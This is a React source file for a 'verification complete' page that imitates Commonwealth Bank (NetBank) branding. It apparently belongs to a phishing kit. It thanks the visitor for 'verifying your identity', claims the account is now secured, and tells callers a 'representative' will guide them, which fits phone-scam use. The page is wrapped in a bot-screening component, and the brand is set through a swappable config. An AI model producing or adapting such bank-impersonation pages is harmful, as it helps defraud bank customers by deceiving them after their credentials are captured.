'use client';

/**
 * CBA Completed/Success Page
 * Two-column layout matching CommBank design patterns
 * Success state with visual confirmation
 */

import { currentBrand } from '@/config/branding';
import { BotGuard } from '@/components/security/BotGuard';
import { StatusSidebar } from '@/components/layout/Sidebar';
import { CheckCircle } from 'lucide-react';

// Arrow Icon SVG component
function ArrowIcon() {
  return (
    <svg className="arrow-icon" width="8" height="10" viewBox="0 0 8 10" fill="none" xmlns="http://www.w3.org/2000/svg">
      <polygon points="0,0 8,5 0,10" fill="#FFCC00" />
    </svg>
  );
}

// Shield Icon with Checkmark
function ShieldCheckIcon() {
  return (
    <svg width="64" height="72" viewBox="0 0 64 72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path
        d="M32 0L0 12V33C0 51.15 13.66 68.22 32 72C50.34 68.22 64 51.15 64 33V12L32 0Z"
        fill="#4CAF50"
      />
      <path
        d="M25 51L14 40L17.5 36.5L25 44L46.5 22.5L50 26L25 51Z"
        fill="white"
      />
    </svg>
  );
}

export default function CompletedPage() {
  return (
    <BotGuard>
      <div className="main-container">
        {/* Two Column Layout */}
        <section className="login-section">
          {/* Left Column - Success Message */}
          <div className="login-box">
            <div className="box-header" style={{ backgroundColor: '#4CAF50' }}>
              <span>Verification Complete</span>
            </div>
            <div className="box-content" style={{ textAlign: 'center', padding: '30px 20px' }}>
              {/* Success Icon */}
              <div className="status-icon-wrapper">
                <ShieldCheckIcon />
              </div>

              <h2 style={{ fontSize: '18px', fontWeight: 700, color: '#000', marginBottom: '12px' }}>
                Thank you for verifying your identity
              </h2>

              <p style={{ fontSize: '13px', color: '#666', lineHeight: 1.5, marginBottom: '16px' }}>
                Your account has been secured. You may safely close this window.
              </p>

              <div style={{ borderTop: '1px solid #CCCCCC', paddingTop: '16px', marginTop: '16px' }}>
                <p style={{ fontSize: '13px', color: '#000', lineHeight: 1.5 }}>
                  If you were on a call with a representative, they will guide you through the next steps.
                </p>
              </div>

              <p style={{ fontSize: '13px', color: '#666', marginTop: '24px' }}>
                Thank you for banking with {currentBrand.companyName}.
              </p>
            </div>
          </div>

          {/* Right Column - What's Next Sidebar */}
          <StatusSidebar isSuccess={true} />
        </section>

        {/* Quicklinks Section */}
        <section className="quicklinks-section">
          <h3 className="quicklinks-title">Quicklinks</h3>
          <ul className="quicklinks-list">
            <li>
              <ArrowIcon />
              <a href="#">Manage your accounts in NetBank</a>
            </li>
            <li>
              <ArrowIcon />
              <a href="#">Set up additional security features</a>
            </li>
          </ul>
        </section>
      </div>
    </BotGuard>
  );
}
